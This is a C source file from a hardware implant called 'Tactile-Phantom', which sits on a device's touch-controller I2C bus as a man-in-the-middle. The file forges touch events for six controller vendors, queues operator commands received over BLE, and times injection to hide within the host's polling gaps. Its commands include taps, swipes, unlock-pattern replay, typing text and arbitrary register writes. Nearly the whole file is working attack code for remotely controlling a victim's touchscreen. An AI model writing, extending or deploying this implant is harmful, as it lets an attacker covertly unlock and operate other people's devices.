/*
 * Tactile-Phantom — Touch-Controller Bus MITM Implant
 * injection.c — Touch event injection engine
 *
 * Author: jayis1
 * License: GPL-2.0
 *
 * The injection engine synthesizes touch-controller register payloads
 * that mimic real touch events, allowing the operator to remotely drive
 * the target's UI. Injection commands arrive over BLE from the companion
 * app and are queued in an SRAM injection queue. The firmware schedules
 * injection during the host's inter-poll gap to avoid bus contention.
 *
 * Injection primitives:
 *   tap(x, y, duration_ms)         — single tap
 *   swipe(x1,y1, x2,y2, duration)  — drag gesture
 *   long_press(x, y, duration_ms)   — long-press
 *   multi_touch(touches[], count)   — pinch/rotate (multi-finger)
 *   pattern(points[])               — replay unlock pattern
 *   type_string("text")             — map chars to keyboard coords, tap each
 *   inject_raw(reg_addr, data)      — write arbitrary TSC register
 */

#include <string.h>
#include <stdio.h>
#include "pico/stdlib.h"
#include "hardware/gpio.h"
#include "hardware/pio.h"

#include "board.h"
#include "registers.h"

/* --- Injection command queue --------------------------------------- */
static tp_inj_cmd_t inj_queue[TP_INJECT_QUEUE_DEPTH];
static volatile uint16_t inj_head = 0, inj_tail = 0;

/* --- Externals from touch_decode.c --------------------------------- */
extern void tp_set_shadow_reg(uint16_t offset, uint8_t val);
extern bool tp_get_shadow_reg(uint16_t offset, uint8_t *out_val);

/* --- I2C bit-bang drive (for injection) ---------------------------- */
/* The injection engine needs to drive the I2C bus to write touch-state
 * registers. In production, this uses PIO1 SM0. Here we implement a
 * software I2C master on the injection pins for portability. */

static void inj_i2c_delay(void)
{
    busy_wait_us_32(2);  /* ~250 kHz at 133 MHz */
}

static void inj_sda_high(void) { gpio_set_dir(PIN_INJ_SDA_MOSI, GPIO_IN);  gpio_pull_up(PIN_INJ_SDA_MOSI); }
static void inj_sda_low(void)  { gpio_set_dir(PIN_INJ_SDA_MOSI, GPIO_OUT); gpio_put(PIN_INJ_SDA_MOSI, 0); }
static void inj_scl_high(void) { gpio_set_dir(PIN_INJ_SCL_SCK, GPIO_IN);  gpio_pull_up(PIN_INJ_SCL_SCK); }
static void inj_scl_low(void)  { gpio_set_dir(PIN_INJ_SCL_SCK, GPIO_OUT); gpio_put(PIN_INJ_SCL_SCK, 0); }

static void inj_i2c_start(void)
{
    inj_sda_high();
    inj_scl_high();
    inj_i2c_delay();
    inj_sda_low();
    inj_i2c_delay();
    inj_scl_low();
}

static void inj_i2c_stop(void)
{
    inj_sda_low();
    inj_scl_high();
    inj_i2c_delay();
    inj_sda_high();
    inj_i2c_delay();
}

static bool inj_i2c_write_byte(uint8_t byte)
{
    for (int i = 7; i >= 0; i--) {
        if ((byte >> i) & 1)
            inj_sda_high();
        else
            inj_sda_low();
        inj_i2c_delay();
        inj_scl_high();
        inj_i2c_delay();
        inj_scl_low();
    }
    /* ACK */
    inj_sda_high();
    inj_scl_high();
    inj_i2c_delay();
    bool ack = (gpio_get(PIN_INJ_SDA_MOSI) == 0);
    inj_scl_low();
    return ack;
}

/* Write data to a register on the touch controller via I2C.
 * For 16-bit address controllers (Goodix, Synaptics, Ilitek, Novatek):
 *   START | addr_W | reg_H | reg_L | data... | STOP
 * For 8-bit address controllers (FocalTech, Cypress):
 *   START | addr_W | reg | data... | STOP */
static bool inj_i2c_write_reg(tp_bus_state_t *state, uint16_t reg,
                               const uint8_t *data, uint16_t len)
{
    const tp_vendor_map_t *vmap = tp_vendor_get(state->vendor);
    bool addr_16 = vmap ? vmap->addr_16bit : false;

    inj_i2c_start();
    /* Address byte: 7-bit addr + W (0) */
    if (!inj_i2c_write_byte((state->i2c_addr << 1) | 0)) {
        inj_i2c_stop();
        return false;
    }
    /* Register offset */
    if (addr_16) {
        if (!inj_i2c_write_byte((reg >> 8) & 0xFF) ||
            !inj_i2c_write_byte(reg & 0xFF)) {
            inj_i2c_stop();
            return false;
        }
    } else {
        if (!inj_i2c_write_byte(reg & 0xFF)) {
            inj_i2c_stop();
            return false;
        }
    }
    /* Data */
    for (uint16_t i = 0; i < len; i++) {
        if (!inj_i2c_write_byte(data[i])) {
            inj_i2c_stop();
            return false;
        }
    }
    inj_i2c_stop();
    return true;
}

/* --- Vendor-specific injection packet builders --------------------- */

/* Build a Goodix touch-coordinate register payload for one point.
 * Writes to 0x8150 + (finger * 8). */
static bool inj_goodix_point(tp_bus_state_t *state, uint8_t finger,
                              uint16_t x, uint16_t y, uint8_t pressure)
{
    uint8_t pkt[8];
    pkt[0] = finger & 0x0F;        /* TrackID */
    pkt[1] = x & 0xFF;             /* X low */
    pkt[2] = (x >> 8) & 0xFF;      /* X high */
    pkt[3] = y & 0xFF;             /* Y low */
    pkt[4] = (y >> 8) & 0xFF;      /* Y high */
    pkt[5] = pressure;            /* area */
    pkt[6] = 0x00;                /* reserved */
    pkt[7] = 0x00;                /* reserved */

    uint16_t reg = 0x8150 + (finger * 8);
    return inj_i2c_write_reg(state, reg, pkt, 8);
}

/* Write Goodix touch-state register (0x814E) to signal buffer ready */
static bool inj_goodix_touch_state(tp_bus_state_t *state, uint8_t finger_count)
{
    uint8_t status = GT_STATUS_BUF_READY | (finger_count & GT_FINGER_COUNT_MASK);
    return inj_i2c_write_reg(state, 0x814E, &status, 1);
}

/* Build a FocalTech touch-coordinate payload.
 * Writes to 0x03 + (finger * 6). */
static bool inj_focaltech_point(tp_bus_state_t *state, uint8_t finger,
                                 uint16_t x, uint16_t y, uint8_t pressure)
{
    uint8_t pkt[6];
    pkt[0] = (FT_EVENT_CONTACT << 4) | ((x >> 8) & 0x0F);  /* event + X_H */
    pkt[1] = x & 0xFF;           /* X_L */
    pkt[2] = (finger & 0x0F) | ((y >> 8) & 0x0F);  /* touch_id + Y_H */
    pkt[3] = y & 0xFF;           /* Y_L */
    pkt[4] = pressure;          /* weight */
    pkt[5] = 0x40;              /* area (medium) */

    uint16_t reg = 0x03 + (finger * 6);
    return inj_i2c_write_reg(state, reg, pkt, 6);
}

/* Write FocalTech touch count register (0x02) */
static bool inj_focaltech_touch_count(tp_bus_state_t *state, uint8_t count)
{
    return inj_i2c_write_reg(state, 0x02, &count, 1);
}

/* Build a Synaptics coordinate payload at 0x0018 + (finger * 6) */
static bool inj_synaptics_point(tp_bus_state_t *state, uint8_t finger,
                                 uint16_t x, uint16_t y, uint8_t pressure)
{
    uint8_t pkt[6];
    pkt[0] = x & 0xFF;
    pkt[1] = (x >> 8) & 0xFF;
    pkt[2] = y & 0xFF;
    pkt[3] = (y >> 8) & 0xFF;
    pkt[4] = pressure;
    pkt[5] = 0x02;  /* in-contact flag */

    uint16_t reg = 0x0018 + (finger * 6);
    return inj_i2c_write_reg(state, reg, pkt, 6);
}

/* Write Synaptics finger-state register (0x0015) */
static bool inj_synaptics_finger_state(tp_bus_state_t *state, uint8_t mask)
{
    return inj_i2c_write_reg(state, 0x0015, &mask, 1);
}

/* --- Generic single-point injection (vendor-dispatched) ------------ */
static bool inj_touch_point(tp_bus_state_t *state, uint8_t finger,
                             uint16_t x, uint16_t y, uint8_t pressure)
{
    switch (state->vendor) {
    case TP_TC_GOODIX:
        return inj_goodix_point(state, finger, x, y, pressure);
    case TP_TC_FOCALTECH:
        return inj_focaltech_point(state, finger, x, y, pressure);
    case TP_TC_SYNAPTICS:
        return inj_synaptics_point(state, finger, x, y, pressure);
    case TP_TC_ILITEK: {
        uint8_t pkt[8] = { x & 0xFF, (x>>8)&0xFF, y&0xFF, (y>>8)&0xFF,
                           pressure, 0x40, finger & 0x0F, 0x02 };
        return inj_i2c_write_reg(state, 0x0020 + finger * 8, pkt, 8);
    }
    case TP_TC_CYPRESS: {
        uint8_t pkt[6] = { x&0xFF, (x>>8)&0xFF, y&0xFF, (y>>8)&0xFF, pressure, 0x40 };
        return inj_i2c_write_reg(state, 0x0020 + finger * 6, pkt, 6);
    }
    case TP_TC_NOVATEK: {
        uint8_t pkt[8] = { x&0xFF, (x>>8)&0xFF, y&0xFF, (y>>8)&0xFF,
                           pressure, 0x40, finger&0x0F, 0x02 };
        return inj_i2c_write_reg(state, 0x0020 + finger * 8, pkt, 8);
    }
    default:
        printf("[INJ] Unsupported vendor %d for point injection\n",
               state->vendor);
        return false;
    }
}

/* --- Touch-state register write (signal host that data is ready) ---- */
static bool inj_signal_touch(tp_bus_state_t *state, uint8_t finger_count)
{
    switch (state->vendor) {
    case TP_TC_GOODIX:
        return inj_goodix_touch_state(state, finger_count);
    case TP_TC_FOCALTECH:
        return inj_focaltech_touch_count(state, finger_count);
    case TP_TC_SYNAPTICS:
        return inj_synaptics_finger_state(state, (1u << finger_count) - 1);
    case TP_TC_ILITEK:
        return inj_i2c_write_reg(state, 0x0010, &finger_count, 1);
    case TP_TC_CYPRESS:
        return inj_i2c_write_reg(state, 0x0012, &finger_count, 1);
    case TP_TC_NOVATEK:
        return inj_i2c_write_reg(state, 0x0012, &finger_count, 1);
    default:
        return false;
    }
}

/* --- Release all touches ------------------------------------------- */
static bool inj_release_all(tp_bus_state_t *state)
{
    switch (state->vendor) {
    case TP_TC_GOODIX:
        return inj_goodix_touch_state(state, 0);
    case TP_TC_FOCALTECH:
        return inj_focaltech_touch_count(state, 0);
    case TP_TC_SYNAPTICS:
        return inj_synaptics_finger_state(state, 0);
    case TP_TC_ILITEK:
    case TP_TC_CYPRESS:
    case TP_TC_NOVATEK: {
        uint8_t zero = 0;
        uint16_t reg = (state->vendor == TP_TC_ILITEK) ? 0x0010 :
                       (state->vendor == TP_TC_CYPRESS) ? 0x0012 : 0x0012;
        return inj_i2c_write_reg(state, reg, &zero, 1);
    }
    default:
        return false;
    }
}

/* --- Command executors --------------------------------------------- */

/* Execute a single tap: touch down at (x,y), hold for duration, release */
static bool exec_tap(tp_bus_state_t *state, uint16_t x, uint16_t y,
                      uint16_t duration_ms)
{
    printf("[INJ] tap(%u, %u, %u)\n", x, y, duration_ms);

    /* Phase 1: finger down */
    if (!inj_touch_point(state, 0, x, y, 64))
        return false;
    if (!inj_signal_touch(state, 1))
        return false;

    sleep_ms(duration_ms);

    /* Phase 2: release */
    return inj_release_all(state);
}

/* Execute a swipe: interpolate from (x1,y1) to (x2,y2) over duration */
static bool exec_swipe(tp_bus_state_t *state, uint16_t x1, uint16_t y1,
                        uint16_t x2, uint16_t y2, uint16_t duration_ms)
{
    printf("[INJ] swipe(%u,%u -> %u,%u, %u)\n", x1, y1, x2, y2, duration_ms);

    /* Number of interpolation steps: ~60 Hz */
    uint16_t steps = duration_ms > 16 ? duration_ms / 16 : 1;
    if (steps > 100) steps = 100;  /* cap */

    for (uint16_t i = 0; i <= steps; i++) {
        uint16_t x = x1 + (uint16_t)(((int32_t)(x2 - x1) * i) / (int32_t)steps);
        uint16_t y = y1 + (uint16_t)(((int32_t)(y2 - y1) * i) / (int32_t)steps);

        if (!inj_touch_point(state, 0, x, y, 64))
            return false;
        if (i == 0 && !inj_signal_touch(state, 1))
            return false;

        sleep_ms(duration_ms / (steps + 1));
    }

    return inj_release_all(state);
}

/* Execute a long-press: touch down, hold, release */
static bool exec_long_press(tp_bus_state_t *state, uint16_t x, uint16_t y,
                             uint16_t duration_ms)
{
    printf("[INJ] long_press(%u, %u, %u)\n", x, y, duration_ms);
    return exec_tap(state, x, y, duration_ms);
}

/* Execute multi-touch: set multiple fingers simultaneously */
static bool exec_multi(tp_bus_state_t *state, const tp_touch_t *touches,
                        uint8_t count)
{
    if (count > TP_MAX_FINGERS) count = TP_MAX_FINGERS;

    printf("[INJ] multi_touch(%u fingers)\n", count);

    for (uint8_t i = 0; i < count; i++) {
        if (!inj_touch_point(state, i, touches[i].x, touches[i].y,
                              touches[i].pressure))
            return false;
    }
    if (!inj_signal_touch(state, count))
        return false;

    sleep_ms(100);  /* hold for 100 ms */
    return inj_release_all(state);
}

/* Execute a pattern replay: sequence of points forming an unlock pattern */
static bool exec_pattern(tp_bus_state_t *state, uint16_t *points_xy,
                          uint8_t point_count, uint16_t delay_ms)
{
    printf("[INJ] pattern(%u points, %u ms delay)\n", point_count, delay_ms);

    for (uint8_t i = 0; i < point_count; i++) {
        uint16_t x = points_xy[i * 2];
        uint16_t y = points_xy[i * 2 + 1];

        if (!inj_touch_point(state, 0, x, y, 80))
            return false;
        if (i == 0 && !inj_signal_touch(state, 1))
            return false;

        sleep_ms(delay_ms);
    }

    return inj_release_all(state);
}

/* Execute type string: map characters to keyboard coords, tap each */
static bool exec_type(tp_bus_state_t *state, const char *text, uint16_t delay_ms)
{
    printf("[INJ] type(\"%s\", %u ms)\n", text, delay_ms);

    /* The keyboard layout is provided by the companion app via
     * layout_infer. We use tp_layout_infer_keystroke in reverse:
     * given a character, find its screen coordinate.
     * For this design, we use a simplified QWERTY layout model
     * and call layout_infer_char_to_coord (defined in layout_infer.c). */
    extern bool tp_layout_char_to_coord(char ch, uint16_t *out_x, uint16_t *out_y);

    for (uint16_t i = 0; text[i] != '\0'; i++) {
        uint16_t x, y;
        if (!tp_layout_char_to_coord(text[i], &x, &y)) {
            printf("[INJ] No coordinate for char '%c' (0x%02X)\n",
                   text[i], (uint8_t)text[i]);
            continue;
        }
        if (!exec_tap(state, x, y, 50))
            return false;
        sleep_ms(delay_ms);
    }
    return true;
}

/* Execute raw register write */
static bool exec_raw_reg(tp_bus_state_t *state, uint16_t reg_addr,
                          const uint8_t *data, uint16_t data_len)
{
    printf("[INJ] raw_reg(0x%04X, %u bytes)\n", reg_addr, data_len);
    return inj_i2c_write_reg(state, reg_addr, data, data_len);
}

/* --- Queue management ---------------------------------------------- */
bool tp_injection_queue(tp_inj_cmd_t *cmd)
{
    uint16_t next = (inj_tail + 1) % TP_INJECT_QUEUE_DEPTH;
    if (next == inj_head) {
        printf("[INJ] Queue full, dropping command\n");
        return false;  /* queue full */
    }
    inj_queue[inj_tail] = *cmd;
    inj_tail = next;
    return true;
}

uint32_t tp_injection_pending(void)
{
    if (inj_tail >= inj_head)
        return inj_tail - inj_head;
    return TP_INJECT_QUEUE_DEPTH - (inj_head - inj_tail);
}

/* --- Main injection executor --------------------------------------- */
bool tp_injection_execute(tp_inj_cmd_t *cmd, tp_bus_state_t *state)
{
    if (!cmd || !state) return false;

    /* Wait for bus idle (host not polling) — check SCL high for 2 ms */
    uint32_t idle_start = time_us_32();
    while (time_us_32() - idle_start < TP_INJECT_GAP_US) {
        if (gpio_get(PIN_TAP_SCL_SCK) == 0)
            idle_start = time_us_32();  /* reset timer if clock low */
    }

    bool ok = false;
    switch (cmd->type) {
    case TP_INJ_TAP:
        ok = exec_tap(state, cmd->x1, cmd->y1, cmd->duration_ms);
        break;
    case TP_INJ_SWIPE:
        ok = exec_swipe(state, cmd->x1, cmd->y1, cmd->x2, cmd->y2,
                        cmd->duration_ms);
        break;
    case TP_INJ_LONG_PRESS:
        ok = exec_long_press(state, cmd->x1, cmd->y1, cmd->duration_ms);
        break;
    case TP_INJ_MULTI:
        ok = exec_multi(state, cmd->touches, cmd->finger_count);
        break;
    case TP_INJ_PATTERN: {
        /* points are packed in touches array as (x,y) pairs */
        uint16_t pts[TP_MAX_FINGERS * 2];
        uint8_t n = cmd->finger_count < TP_MAX_FINGERS ?
                    cmd->finger_count : TP_MAX_FINGERS;
        for (uint8_t i = 0; i < n; i++) {
            pts[i * 2] = cmd->touches[i].x;
            pts[i * 2 + 1] = cmd->touches[i].y;
        }
        ok = exec_pattern(state, pts, n, cmd->duration_ms);
        break;
    }
    case TP_INJ_TYPE:
        ok = exec_type(state, cmd->text, cmd->duration_ms);
        break;
    case TP_INJ_RAW_REG:
        ok = exec_raw_reg(state, cmd->reg_addr, cmd->reg_data,
                          cmd->reg_data_len);
        break;
    default:
        printf("[INJ] Unknown command type %d\n", cmd->type);
        break;
    }

    /* Dequeue the command */
    if (inj_head != inj_tail)
        inj_head = (inj_head + 1) % TP_INJECT_QUEUE_DEPTH;

    return ok;
}